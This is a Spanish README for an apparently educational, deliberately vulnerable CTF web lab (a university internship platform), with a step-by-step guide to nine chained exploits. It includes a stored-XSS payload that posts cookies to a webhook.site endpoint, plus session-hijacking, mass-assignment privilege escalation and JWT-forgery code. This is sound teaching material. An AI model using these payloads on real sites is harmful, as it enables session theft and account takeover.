# InternLink - Laboratorio CTF Vulnerable

## 🎯 Descripción

**InternLink** es un laboratorio CTF (Capture The Flag) educativo que simula un sistema de gestión de pasantías universitarias con múltiples vulnerabilidades encadenadas. El objetivo es escalar desde un usuario estudiante normal hasta administrador del sistema, explotando 9 vulnerabilidades reales.

## 🚩 Flags Disponibles

1. `FLAG{user_enumeration_is_real}` - Enumeración de usuarios
2. `FLAG{stored_xss_persisted}` - Stored XSS vía upload de CV
3. `FLAG{session_hijacked}` - Session Hijacking
4. `FLAG{idor_horizontal}` - IDOR Horizontal
5. `FLAG{mass_assignment_abuse}` - Mass Assignment
6. `FLAG{binary_files_hide_secrets}` - Análisis de archivos binarios
7. `FLAG{jwt_forged_successfully}` - JWT Forgery
8. `FLAG{logs_are_sensitive}` - Logs expuestos
9. `FLAG{internlink_compromised}` - Acceso total como admin

## 📋 Requisitos

- Python 3.8+
- Cuenta de Upstash Redis (gratuita)
- Navegador web moderno

## 🚀 Instalación

1. **Clonar el repositorio:**
```bash
git clone <repository-url>
cd uvleak
```

2. **Crear entorno virtual:**
```bash
python -m venv venv
source venv/bin/activate  # En Windows: venv\Scripts\activate
```

3. **Instalar dependencias:**
```bash
pip install -r requirements.txt
```

4. **Configurar variables de entorno:**

El archivo `.env` ya debe contener:
```env
UPSTASH_REDIS_REST_URL="tu_url_de_upstash"
UPSTASH_REDIS_REST_TOKEN="tu_token_de_upstash"
```

5. **Ejecutar la aplicación:**
```bash
python app.py
```

La aplicación estará disponible en: `http://localhost:5000`

## 🎮 Guía de Explotación

### ACTO 1: Enumeración de Usuarios

**Objetivo:** Descubrir usuarios existentes en el sistema.

**Método:**
1. Accede a la página de registro
2. Prueba diferentes emails en el campo de correo
3. Observa las respuestas del endpoint `/api/check-email`
4. Usuarios de ejemplo existentes:
   - `empresa@techcorp.com`
   - `coordinador@internlink.com`
   - `admin@internlink.com`

**Vulnerabilidad:** El endpoint devuelve respuestas distintas según el email exista o no, sin rate limiting.

---

### ACTO 2: Stored XSS vía Upload de CV

**Objetivo:** Inyectar JavaScript malicioso a través del upload de CV.

**Método:**
1. Regístrate como estudiante
2. Crea un archivo HTML malicioso:

```html
<!DOCTYPE html>
<html>
<body>
<h1>Curriculum Vitae</h1>
<script>
// Robar cookies y enviarlas a tu servidor
fetch('https://webhook.site/tu-webhook-id', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        origin: window.location.href
    })
});
</script>
</body>
</html>
```

3. Renombra el archivo a `cv_malicioso.pdf`
4. Súbelo desde tu panel de estudiante
5. El sistema "procesará" automáticamente el CV y ejecutará el JavaScript

**Vulnerabilidad:** Solo valida la extensión del archivo, no el tipo MIME real.

---

### ACTO 3: Session Hijacking

**Objetivo:** Usar las cookies robadas para acceder a cuentas de otros usuarios.

**Método:**
1. Una vez capturada la cookie de sesión (desde el XSS del ACTO 2)
2. Abre las DevTools del navegador (F12)
3. En la consola, ejecuta:

```javascript
document.cookie = "session_token=cookie_robada_aqui";
location.reload();
```

4. O usa una extensión para editar cookies
5. Accede al panel de la empresa/coordinador/admin según la cookie robada

**Vulnerabilidad:** Las cookies no tienen la flag `HttpOnly`, permitiendo acceso desde JavaScript.

---

### ACTO 4: IDOR Horizontal

**Objetivo:** Acceder a datos de otras empresas modificando el ID.

**Método:**
1. Accede como empresa (usando cookies robadas o registrándote)
2. Visita el endpoint: `/api/company/candidates?company_id=1`
3. Cambia el `company_id` a otros valores (2, 3, 4...)
4. Observa que puedes ver candidatos de otras empresas

**Vulnerabilidad:** No hay validación de ownership del `company_id`.

---

### ACTO 5: Mass Assignment

**Objetivo:** Escalar privilegios modificando el campo `role`.

**Método:**
1. Desde tu panel de estudiante, abre DevTools (F12)
2. En la consola, ejecuta:

```javascript
fetch('/api/profile/update', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        role: 'coordinator'
    })
})
.then(r => r.json())
.then(data => {
    console.log(data);
    location.reload();
});
```

3. Recarga la página y ahora serás coordinador
4. Repite cambiando a `'admin'` para acceso total

**Vulnerabilidad:** El endpoint actualiza cualquier campo enviado, incluyendo `role`.

---

### ACTO 6: Análisis de Archivo Binario

**Objetivo:** Extraer información oculta de un archivo Excel.

**Método:**
1. Como coordinador, visita `/exports/candidates`
2. Verás contenido binario ilegible en el navegador
3. Guarda el archivo (Ctrl+S)
4. Renómbralo a `candidates.xlsx`
5. Ábrelo en Excel
6. Encuentra la hoja oculta "Config" con:
   - JWT Secret: `internlink2024`
   - Flag correspondiente

**En Linux puedes usar:**
```bash
file candidates  # Identificar tipo de archivo
mv candidates candidates.xlsx
```

**Vulnerabilidad:** Archivo Excel servido sin extensión contiene información sensible.

---

### ACTO 7: JWT Forgery

**Objetivo:** Crear un token JWT falso con rol de admin.

**Método:**
1. Con el JWT_SECRET descubierto (`internlink2024`)
2. Usa herramientas como [jwt.io](https://jwt.io) o Python:

```python
import jwt

payload = {
    'user_id': '1',
    'email': 'atacante@test.com',
    'role': 'admin'
}

token = jwt.encode(payload, 'internlink2024', algorithm='HS256')
print(token)
```

3. Prueba el token en `/api/auth/verify-jwt`:

```javascript
fetch('/api/auth/verify-jwt', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        token: 'tu_token_generado'
    })
})
.then(r => r.json())
.then(data => console.log(data));
```

**Vulnerabilidad:** JWT firmado con secret débil y hardcodeado.

---

### ACTO 8: Logs Expuestos

**Objetivo:** Encontrar información sensible en logs públicos.

**Método:**
1. Visita directamente: `http://localhost:5000/logs/debug.log`
2. Encuentra:
   - Credenciales temporales
   - JWT Secret
   - URLs de conexión
   - Stack traces con información sensible
   - El flag correspondiente

**Vulnerabilidad:** Logs accesibles sin autenticación.

---

### ACTO FINAL: Acceso Total como Admin

**Objetivo:** Usar el acceso de admin para modificar datos críticos.

**Método:**
1. Una vez con rol `admin` (vía Mass Assignment o JWT Forgery)
2. Visita `/dashboard/admin`
3. Modifica salarios:

```javascript
fetch('/api/admin/update-salary', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        student_id: '1',
        salary: '999999999'
    })
})
.then(r => r.json())
.then(data => console.log(data));
```

4. Aprueba ofertas arbitrariamente
5. Captura el flag final

**Vulnerabilidad:** Panel admin sin validaciones adicionales, sin logging real, sin auditoría.

---

## 🔐 Vulnerabilidades Implementadas

| # | Vulnerabilidad | Severidad | OWASP Top 10 |
|---|---------------|-----------|--------------|
| 1 | User Enumeration | Media | A01:2021 - Broken Access Control |
| 2 | Stored XSS | Alta | A03:2021 - Injection |
| 3 | Session Hijacking | Alta | A07:2021 - Identification Failures |
| 4 | IDOR Horizontal | Alta | A01:2021 - Broken Access Control |
| 5 | Mass Assignment | Crítica | A08:2021 - Software Integrity Failures |
| 6 | Information Disclosure | Media | A05:2021 - Security Misconfiguration |
| 7 | JWT Weak Secret | Crítica | A02:2021 - Cryptographic Failures |
| 8 | Exposed Logs | Alta | A05:2021 - Security Misconfiguration |
| 9 | Insufficient Authorization | Crítica | A01:2021 - Broken Access Control |

## 🎓 Propósito Educativo

Este laboratorio está diseñado exclusivamente con fines educativos para:
- Entender vulnerabilidades web comunes
- Practicar técnicas de pentesting ético
- Aprender sobre seguridad en aplicaciones web
- Prepararse para certificaciones de seguridad (CEH, OSCP, etc.)

## ⚠️ Advertencias

- **NO** despliegues este código en producción
- **NO** uses estas técnicas en sistemas sin autorización
- Este lab es **intencionalmente vulnerable**
- Úsalo solo en entornos controlados de aprendizaje

## 🛠️ Tecnologías Utilizadas

- **Backend:** Flask (Python)
- **Base de Datos:** Redis (Upstash)
- **Frontend:** HTML5 + CSS3 + Vanilla JavaScript
- **Autenticación:** Cookies + JWT
- **Estilo:** Glassmorphism inspirado en UdeA

## 📚 Recursos de Aprendizaje

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

## 👥 Créditos

Laboratorio creado con fines educativos para el curso de Seguridad en Aplicaciones Web.

## 📄 Licencia

MIT License - Uso educativo únicamente.

---

**¡Buena suerte capturando todos los flags! 🚩**

Si encuentras algún problema o tienes sugerencias, abre un issue en el repositorio.
